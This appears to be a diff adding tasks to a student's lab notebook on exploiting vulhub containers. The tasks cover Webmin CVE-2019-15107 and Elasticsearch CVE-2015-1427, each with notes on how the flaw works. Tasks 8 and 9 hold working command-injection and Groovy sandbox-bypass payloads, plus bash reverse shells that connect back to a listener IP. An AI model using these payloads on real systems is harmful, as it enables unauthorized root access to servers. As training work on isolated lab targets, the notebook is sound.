@@ -232,3 +232,166 @@ docker logs cve-2019-15107-web-1
 - account compromised: root (uid=0)
 - system compromised: webmin docker container (df143b1d3190)
 - administrative privileges obtained: yes
+
+= TASK 6 =
+# module key lines from webmin_backdoor.rb
+grep -n 'send_request\|expired\|old\|cmd\|password_change\|def ' webmin_backdoor.rb
+
+17:  def initialize
+19:    'Name' => 'Webmin password_change.cgi Backdoor'
+31:    versions require the expired password changing feature to be enabled.
+83:  def check
+84:    res = send_request_cgi('method' => 'GET', 'uri' => ...)
+120:  res = execute_command("echo #{token}")
+143:  def exploit
+176: diff: $in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;
+185: diff: $enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);
+203:  def execute_command(cmd, _opts = {})
+204:    send_request_cgi({
+206:      'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
+210:      'expired' => cmd,
+212:      'new1' => token, 'new2' => token,
+214:      'old' => cmd
+
+# vulnerable component: password_change.cgi
+# attack mechanism: command injection via qx// in perl (backtick execution)
+# the 'old' and 'expired' POST parameters are passed directly to qx// without sanitization
+# this allows OS commands embedded in those fields to execute as the webmin process (root)
+
+# webmin logs from exploitation
+docker logs cve-2019-15107-web-1
+172.20.0.3 - - [02/Jun/2026:10:31:17 +0000] "POST /password_change.cgi HTTP/1.1" 200 48539
+172.20.0.3 - - [02/Jun/2026:10:39:51 +0000] "POST /password_change.cgi HTTP/1.1" 200 48539
+172.20.0.3 - - [02/Jun/2026:10:40:15 +0000] "POST /password_change.cgi HTTP/1.1" 200 48539
+
+# reflection
+- vulnerable component: password_change.cgi in Webmin 1.890-1.920
+- CVE-2019-15107 is a supply chain backdoor - malicious code was injected into the build server
+- attack type: OS command injection via qx// (Perl backtick operator) on unsanitized POST params
+- the 'old' and 'expired' params were designed to pass passwords but execute arbitrary commands
+- log evidence: repeated POST to /password_change.cgi from attacker IP correlates with exploitation
+
+= TASK 7 =
+cat manual_webmin_exploit.py
+# python3 script sending POST to /password_change.cgi with attacker command in 'old' and 'expired'
+
+python3 manual_webmin_exploit.py https://localhost:10000 whoami
+[+] HTTP status code: 200
+<!DOCTYPE html>...  (normal webmin page - command output not visible in response)
+
+python3 manual_webmin_exploit.py https://localhost:10000 "touch /tmp/orion_hacked"
+[+] HTTP status code: 200
+
+docker exec -it cve-2019-15107-web-1 bash
+ls -l /tmp/orion_hacked
+-rw-r--r-- 1 root root 0 Jun 15 20:28 /tmp/orion_hacked
+
+# reflection
+- vulnerable endpoint: POST /password_change.cgi
+- HTTP method: POST
+- parameters with attacker-controlled input: 'expired' and 'old'
+- HTTP 200 is NOT proof of exploitation - webmin returns 200 even when command ran
+- file creation proves execution because it creates an observable side effect on the target
+- a shell gives interactive access - run many commands, browse filesystem, escalate, persist
+
+= TASK 8 =
+# start nc listener inside metasploit container (same docker network as webmin)
+docker exec -d metasploit bash -c "(echo 'whoami; id; hostname; pwd'; sleep 5) | nc -lvnp 5555 > /tmp/nc_out.txt 2>&1"
+
+# send reverse shell payload via manual exploit
+python3 manual_webmin_exploit.py https://localhost:10000 "bash -c 'bash -i >& /dev/tcp/172.20.0.3/5555 0>&1'"
+
+# nc output (from /tmp/nc_out.txt inside metasploit container)
+listening on [::]:5555 ...
+connect to [::ffff:172.20.0.3]:5555 from [::ffff:172.20.0.2]:36380 ([::ffff:172.20.0.2]:36380)
+bash: cannot set terminal process group (11): Inappropriate ioctl for device
+bash: no job control in this shell
+root@f0dc03de2497:/usr/share/webmin/acl# whoami; id; hostname; pwd
+root
+uid=0(root) gid=0(root) groups=0(root)
+f0dc03de2497
+/usr/share/webmin/acl
+
+# reflection
+- reverse shell: victim (webmin) initiates outbound TCP connection to attacker listener
+- listener required before exploitation so the callback has a destination to connect to
+- the victim initiates the connection - bypasses inbound firewall rules
+- python script shows timeout error because webmin hangs executing the shell instead of returning HTTP
+- success indicator is the nc connection, not the HTTP response code
+- interactive shell lets attacker run arbitrary commands without sending new HTTP requests each time
+- metasploit automated exactly this: start handler, send exploit payload, catch shell
+
+= TASK 9 =
+# target: Elasticsearch 1.4.2 - CVE-2015-1427 (Groovy Sandbox Bypass RCE)
+# vulhub: vulhub/elasticsearch/CVE-2015-1427
+
+# 1. service identification
+docker compose up -d  # from vulhub/elasticsearch/CVE-2015-1427
+docker ps
+CONTAINER ID   IMAGE                        PORTS                    NAMES
+5cea7beadeb5   vulhub/elasticsearch:1.4.2   0.0.0.0:9200->9200/tcp   cve-2015-1427-es-1
+
+# 2. version discovery
+nmap -sV localhost -p 9200
+PORT     STATE SERVICE VERSION
+9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Hephaestus; cluster: elasticsearch; Lucene 4.10.2)
+
+curl -s http://localhost:9200/
+{"status":200,"name":"Hephaestus","version":{"number":"1.4.2",...},"tagline":"You Know, for Search"}
+
+# 3. public vulnerability research
+searchsploit "elasticsearch"
+ElasticSearch - Remote Code Execution         | linux/remote/36337.py
+ElasticSearch - Search Groovy Sandbox Bypass  | java/remote/36415.rb
+
+searchsploit --cve 2015-1427
+ElasticSearch - Remote Code Execution         | linux/remote/36337.py
+ElasticSearch - Search Groovy Sandbox Bypass  | java/remote/36415.rb
+
+# 4. CVE: CVE-2015-1427
+# Elasticsearch < 1.3.8 and < 1.4.3 allow unauthenticated RCE via Groovy dynamic scripting.
+# The sandbox implemented after CVE-2014-3120 was insufficient.
+# Reflection bypass: java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec()
+
+# 5. exploit - add document first (required for script_fields to fire)
+curl -X POST "http://localhost:9200/website/blog/" -d '{"name":"test"}'
+{"_index":"website","_type":"blog","_id":"...","created":true}
+
+# 6. exploit execution - Groovy RCE via search API
+curl -s -X POST "http://localhost:9200/_search?pretty" -H "Content-Type: application/json" -d \
+'{"size":1,"script_fields":{"lupin":{"lang":"groovy","script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
+
+Response:
+"lupin" : [ "uid=0(root) gid=0(root) groups=0(root)\n" ]
+
+# 7. evidence of command execution
+curl ... -d '{script: ["/bin/sh","-c","touch /tmp/orion_elastic_hacked"].execute().text}'
+docker exec cve-2015-1427-es-1 ls -la /tmp/orion_elastic_hacked
+-rw-r--r-- 1 root root 0 Jun 15 20:42 /tmp/orion_elastic_hacked
+
+# 8. interactive shell
+# listener inside metasploit container
+docker exec -d metasploit bash -c "(echo 'whoami; id; hostname; pwd'; sleep 5) | nc -lvnp 5557 > /tmp/nc_es.txt 2>&1"
+
+# trigger via Groovy array execute
+curl -X POST "http://localhost:9200/_search?pretty" -d \
+'{"size":1,"script_fields":{"lupin":{"lang":"groovy","script":"[\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/172.22.0.3/5557 0>&1\"].execute()"}}}'
+
+# nc output
+listening on [::]:5557 ...
+connect to [::ffff:172.22.0.3]:5557 from [::ffff:172.22.0.2]:35242
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@5cea7beadeb5:/usr/share/elasticsearch# whoami; id; hostname; pwd
+root
+uid=0(root) gid=0(root) groups=0(root)
+5cea7beadeb5
+/usr/share/elasticsearch
+
+# reflection
+- same methodology worked: deploy -> nmap -> searchsploit -> exploit -> shell
+- elasticsearch ran dynamic scripting enabled by default - no auth required
+- sandbox bypass used Java reflection which the SecureASTCustomizer did not block
+- metasploit module for this CVE failed (ARM emulation compatibility issue)
+- manual curl exploit was simpler and more reliable
+- root shell obtained on a search engine service - typical in poorly secured internal networks
